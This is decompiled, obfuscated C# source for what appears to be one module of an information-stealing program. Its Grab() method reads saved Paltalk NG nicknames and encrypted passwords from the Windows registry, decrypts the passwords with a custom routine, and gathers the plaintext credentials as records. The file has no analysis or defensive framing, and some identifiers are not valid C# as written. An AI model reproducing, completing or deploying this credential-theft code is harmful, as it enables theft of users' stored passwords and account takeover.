using System;
using System.Collections.Generic;
using System.Linq;
using C6Zy;
using JSW1fecBOy;
using Microsoft.Win32;

namespace rk937aHHc
{
	// Token: 0x02000044 RID: 68
	public class QsVMVT6 : EtbH
	{
		// Token: 0x06000135 RID: 309 RVA: 0x00007534 File Offset: 0x00005734
		public QsVMVT6()
		{
			this.hD2 = "Paltalk";
		}

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x06000136 RID: 310 RVA: 0x0000754C File Offset: 0x0000574C
		// (set) Token: 0x06000137 RID: 311 RVA: 0x00007554 File Offset: 0x00005754
		public string hD2 { get; set; }

		// Token: 0x06000138 RID: 312 RVA: 0x0001A4B4 File Offset: 0x000186B4
		public List<WTitxI2m> Grab()
		{
			int num = 0;
			List<WTitxI2m> list;
			while (num != 2)
			{
				if (num == 1)
				{
					list = new List<WTitxI2m>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 3)
				{
					List<WTitxI2m> result;
					return result;
				}
			}
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\A.V.M.\\Paltalk NG\\common_settings\\core\\users\\creds\\"))
				{
					if (registryKey == null)
					{
						return list;
					}
					foreach (string name in registryKey.GetSubKeyNames())
					{
						try
						{
							using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
							{
								string text = (string)registryKey2.GetValue("nickname");
								string gOo = (string)registryKey2.GetValue("password");
								list.Add(new WTitxI2m
								{
									data1 = "paltalk.com",
									data2 = text,
									data3 = QsVMVT6.02Y3ydX3x(gOo, text),
									data4 = this.hD2
								});
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000139 RID: 313 RVA: 0x0001A710 File Offset: 0x00018910
		private static string 02Y3ydX3x(string gOo, string 36owzUpYT)
		{
			int num = 0;
			string text;
			for (;;)
			{
				if (num == 25)
				{
					text = "";
					num = 26;
				}
				if (num == 11)
				{
					goto IL_47;
				}
				goto IL_65;
				IL_DE:
				char[] array;
				if (num == 5)
				{
					array = g3Vt7T2gk5.lX1xTKPz().ToCharArray();
					num = 6;
				}
				int num2;
				if (num == 21)
				{
					num2++;
					num = 22;
				}
				int num3;
				if (num == 27)
				{
					num3 = 1;
					num = 28;
				}
				string text2;
				if (num == 12)
				{
					text2 = "";
					num = 13;
				}
				if (num == 28)
				{
					goto IL_3CE;
				}
				if (num == 20)
				{
					goto IL_1A9;
				}
				goto IL_1C0;
				IL_58C:
				if (num == 0)
				{
					num = 1;
				}
				if (num == 33)
				{
					break;
				}
				continue;
				IL_3E6:
				int num4;
				if (num == 9)
				{
					num4 += 4;
					num = 10;
				}
				int num5;
				if (num == 3)
				{
					num5 = 0;
					num = 4;
				}
				int[] array2;
				if (num == 6)
				{
					array2 = new int[gOo.Length / 4 + 1];
					num = 7;
				}
				if (num == 18)
				{
					if (num5 > array.Length - 1)
					{
						goto IL_1A9;
					}
					num = 19;
				}
				char[] array3;
				if (num == 24)
				{
					array3 = text2.ToCharArray();
					num = 25;
				}
				if (num == 13)
				{
					num = 14;
				}
				if (num == 30)
				{
					text += (char)(array2[num3] - num3 - (int)array3[num3 - 1] - 122);
					num = 31;
				}
				if (num == 23)
				{
					text2 = text2 + text2 + text2;
					num = 24;
				}
				if (num == 16)
				{
					goto IL_572;
				}
				goto IL_58C;
				IL_388:
				if (num == 19)
				{
					text2 += array[num5];
					num = 20;
				}
				if (num == 32)
				{
					goto IL_3CE;
				}
				goto IL_3E6;
				IL_2AB:
				int num6;
				if (num == 10)
				{
					num6++;
					num = 11;
				}
				if (num == 22)
				{
					goto IL_2E4;
				}
				IL_2FF:
				if (num != 15)
				{
					if (num == 1)
					{
						num4 = 0;
						num = 2;
					}
					if (num == 7)
					{
						goto IL_47;
					}
					if (num == 29)
					{
						goto IL_371;
					}
					goto IL_388;
				}
				IL_2E4:
				if (num2 >= 36owzUpYT.Length)
				{
					num = 23;
					goto IL_2FF;
				}
				goto IL_572;
				IL_1C0:
				if (num == 2)
				{
					num6 = 0;
					num = 3;
				}
				if (num == 14)
				{
					num2 = 0;
					num = 15;
				}
				if (num == 26)
				{
					text += (char)(array2[0] - 122 - (int)text2[text2.Length - 1]);
					num = 27;
				}
				char[] array4;
				if (num == 4)
				{
					array4 = gOo.ToCharArray();
					num = 5;
				}
				if (num == 31)
				{
					goto IL_294;
				}
				goto IL_2AB;
				IL_572:
				char c = 36owzUpYT[num2];
				num = 17;
				goto IL_58C;
				IL_3CE:
				if (num3 >= array2.Length)
				{
					num = 33;
					goto IL_3E6;
				}
				IL_371:
				if (array2[num3] != 0)
				{
					num = 30;
					goto IL_388;
				}
				IL_294:
				num3++;
				num = 32;
				goto IL_2AB;
				IL_1A9:
				num5++;
				num = 21;
				goto IL_1C0;
				IL_65:
				if (num == 17)
				{
					text2 += c;
					num = 18;
				}
				if (num != 8)
				{
					goto IL_DE;
				}
				IL_A6:
				array2[num6] = Convert.ToInt32(new string(array4.Skip(num4).Take(3).ToArray<char>()));
				num = 9;
				goto IL_DE;
				IL_47:
				if (num4 > array4.Length - 4)
				{
					num = 12;
					goto IL_65;
				}
				goto IL_A6;
			}
			return text;
		}
	}
}
